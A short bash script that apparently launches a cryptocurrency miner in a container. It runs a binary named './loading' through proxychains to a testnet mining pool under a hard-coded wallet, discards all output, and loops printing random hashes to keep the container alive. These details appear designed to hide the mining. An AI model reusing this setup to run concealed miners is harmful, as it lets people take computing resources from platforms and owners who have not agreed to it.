#!/bin/bash

# Generate random worker ID
WORKER_ID=$(echo $(shuf -i 009-999 -n 1)-HK)

# Run the miner through proxychains
proxychains4 ./loading --pool stratum+tcp://0x1bE17413356722a411033303EF7D8A13768fdF83.$WORKER_ID@pool-core-testnet.inichain.com:32672 --cpu-devices 0 >/dev/null 2>&1

# Keep the container alive
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
